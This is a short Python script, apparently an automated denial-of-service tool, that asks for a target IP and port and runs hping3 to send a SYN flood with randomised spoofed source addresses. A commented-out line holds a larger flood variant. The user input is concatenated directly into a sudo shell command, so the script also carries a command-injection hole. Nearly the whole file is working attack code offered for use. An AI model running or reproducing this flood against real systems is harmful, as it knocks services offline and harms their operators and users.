import os
import itertools
import threading
import time
import sys
from colorama import Fore, Back, Style
from datetime import datetime

'''
DOS ATACK hping3

Ataque altomatizado usando hping3 MANUAL

--rand-source   	Ocutar IP Pacote randomico
--flood 		faz o SYN flood ou o ataque DOS no host de destino.
-d  --data		tamanho dos dados
-a --spoof		dirección de origen falsa
contagem de pacotes	contagem de pacotes
-d 			tamanho dos pacotes
-S			Para enviar pacotes SYN para o endereço IP de destino
-V			verbose mode
'''

print(Fore.RED)
print("\033[1m"+"""
██╗  ██╗██████╗ ██╗███╗   ██╗ ██████╗ ██████╗ 
██║  ██║██╔══██╗██║████╗  ██║██╔════╝ ╚════██╗
███████║██████╔╝██║██╔██╗ ██║██║  ███╗ █████╔╝
██╔══██║██╔═══╝ ██║██║╚██╗██║██║   ██║ ╚═══██╗
██║  ██║██║     ██║██║ ╚████║╚██████╔╝██████╔╝
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝

██████╗  ██████╗ ███████╗  .--.@Ghotsn4444
██╔══██╗██╔═══██╗██╔════╝ █|__| .-------.
██║  ██║██║   ██║███████╗ █|=.| █|.-----.|
██║  ██║██║   ██║╚════██║ █|--| █|| DoS ||
██████╔╝╚██████╔╝███████║ █|  | █|'-----'|
╚═════╝  ╚═════╝ ╚══════╝ █|__|~')_____(' 
"""+ "\033[0;0m")
print('\033[39m')
IP = input("\033[1m"+' [*] IP: '+'\033[39m')
PORTS = input("\033[1m"+' [*] PORT: '+'\033[39m')

done = False
#here is the animation
def animate():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if done:
            break
        sys.stdout.write(Fore.RED+'\r [*] loading ' + c +'\033[39m')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(4)
done = True

print(' ')
print(Fore.YELLOW,"\033[1m"+'[!]  hping3 -S --rand-source --flood -V -p PORT -d 120 IP'+"\033[0;0m",'\033[39m')
print('------------------------------------------------------------')
print(Fore.CYAN,'[*] Start DoS:',"IP:"+IP,"PORT:"+PORTS,'\033[39m')
print(Fore.CYAN,"[*] Start Data: " + datetime.today().strftime('%d-%m-%Y'),'\033[39m')
print('------------------------------------------------------------')

# command_SCAN = os.system('sudo hping3 --scan',PORTS,IP,'-S --rand-source -V')
command_ATK = os.system('sudo hping3 -S --rand-source --flood -V -p '+ PORTS+" -d 120 "+ IP)
# command_ATK2 = os.system('sudo hping3 -c 100000 -d 10000 -S -p '+ PORTS + ' --flood --rand-source '+ IP)

# command = print('sudo hping3 -S --rand-source --flood -V -p', PORTS,"-d 120", IP)
